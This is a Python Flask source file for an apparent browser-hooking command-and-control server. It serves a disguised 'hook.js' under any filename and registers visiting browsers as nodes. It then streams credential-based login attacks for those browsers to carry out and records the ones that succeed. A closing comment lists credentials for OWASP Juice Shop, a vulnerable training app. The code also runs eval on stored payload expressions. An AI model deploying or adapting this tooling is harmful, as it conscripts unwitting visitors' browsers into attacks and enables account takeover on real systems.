from flask import Flask, request, jsonify, render_template, Response, after_this_request
from flask_cors import cross_origin
from cef import app, db, attack_queue, result_queue
from cef.models import Node, Attack, Result
from cef.utils import fingerprint
from time import sleep
import json

def build_attack(u, p):
    attack = Attack.query.get(1)
    a = {
        'id': 1,
        'method': attack.method,
        'url': attack.url,
        'payload': eval(attack.payload_exp),
        'content_type': attack.content_type,
    }
    return a

def attack_stream():
    while True:
        sleep(3)
        attack = attack_queue.get()
        yield 'data: %s\n\n' % json.dumps(attack)

def result_stream():
    while True:
        result = result_queue.get()
        yield 'data: %s\n\n' % json.dumps(result)

# streaming controllers

@app.route('/stream/attack')
@cross_origin()
def stream_attack():
    fp = fingerprint(request.remote_addr, request.referrer, request.user_agent.string)
    if not Node.get_by_fingerprint(fp):
        node = Node(
            fingerprint=fp,
            ip_address=request.remote_addr,
            target=request.referrer,
            user_agent=request.user_agent.string,
        )
        db.session.add(node)
        db.session.commit()
    return Response(attack_stream(), mimetype='text/event-stream')

@app.route('/stream/result')
def stream_result():
    return Response(result_stream(), mimetype='text/event-stream')

# attack controllers

# go ahead. call the js file whatever you want.
@app.route('/<string:filename>.js')
def js_file(filename):
    @after_this_request
    def add_header(response):
        response.headers['Content-Type'] = 'application/javascript'
        return response
    return render_template('hook.js')

@app.route('/result', methods=['POST'])
@cross_origin()
def result():
    jsonobj = json.loads(request.data)
    # bolt if the attack id has been tampered with
    # ... probably should add back to queue first
    attack = Attack.query.get_or_404(jsonobj['id'])
    resp = jsonobj['result']
    payload = jsonobj['payload']
    if attack.success in resp:
        # store successful results
        fp = fingerprint(request.remote_addr, request.referrer, request.user_agent.string)
        node = Node.get_by_fingerprint(fp)
        result = Result(
            attack_id=attack.id,
            node_id=node.id,
            payload=payload
        )
        db.session.add(result)
        db.session.commit()
    # ... if fail add back to queue
    return 'received'

# c2 controllers

@app.route('/queue')
def queue():
    with open(app.config['CREDS_PATH']) as fp:
        for line in fp:
            u, p = line.strip().split(':')
            a = build_attack(u, p)
            attack_queue.put(a)
    return 'done'

'''
admin@juice-sh.op:admin123
jim@juice-sh.op:ncc-1701
bender@juice-sh.op:OhG0dPlease1nsertLiquor!
bjoern.kimminich@googlemail.com:YmpvZXJuLmtpbW1pbmljaEBnb29nbGVtYWlsLmNvbQ==
ciso@juice-sh.op:mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb
support@juice-sh.op:J6aVjTgOpRs$?5l+Zkq2AYnCE@RF§P
morty@juice-sh.op:focusOnScienceMorty!focusOnScience
mc.safesearch@juice-sh.op:Mr. N00dles
'''